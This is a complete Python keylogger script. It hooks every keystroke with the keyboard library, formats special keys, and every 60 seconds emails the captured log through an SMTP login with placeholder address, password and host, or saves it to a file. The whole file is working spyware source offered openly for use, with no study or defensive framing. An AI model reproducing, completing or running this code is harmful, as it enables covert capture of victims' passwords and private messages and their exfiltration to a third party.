import keyboard #For Logging Keystrokes
import smtplib #For sending email using SMTP Protocol (Gmail)

from threading import Timer #Ensures is to make a method run after an 'interval' amount of time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "<insert email address>"
EMAIL_PASSWORD = "<insert password>"

class keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval #Pass SEND_REPORT_EVERY to "interval" variable
        self.report_method = report_method 
        self.log = "" #Contains the log of all the keystrokes within 'self.interval'
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    #callback func invoked whenever a keyboard event occurs
    def callback(self, event):
        name = event.name


        if len(name) > 1:
            #Not a character, special key (E.g. Ctrl, Alt, Etc)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name #Add key name to global 'self.log' variable
    
    #update_filename func used to rename filenames to be identified by start & end datestimes
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    #report_to_file func creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f: #opens the file in write mode
            print(self.log, file=f) #writes the keylogs to file
        print(f"[+] Saved {self.filename}.txt")

    #Func to construct a MIMEMultipart from a text. Creates a HTML version as well as test version to be sent as an email.
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string() #convert back as string message

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Send an email to {email} containing: {message}")

    #Func invokes every 'self.interval'. Sends keylogs and reset 'self.log' variable
    def report(self):

        #If there is something in log, report it
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename() #Update filename
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}") #If you don't want to print in the console, comment below line
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True #Set thread to daemon (dies when main thread dies)
        timer.start() #Starts the timer

    def start(self):
        self.start_dt = datetime.now() #Record start datetime
        keyboard.on_release(callback=self.callback) #Start the keylogger
        self.report() #Start reporting key strokes
        print(f"{datetime.now()} - Started Keylogger") #Inidicator to indicate when keylogger has started
        keyboard.wait() #block the current thread, wait until Ctrl + C is pressed

if __name__ == "__main__":
    keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="email") #Keylogger to send to email
    keylogger.start()
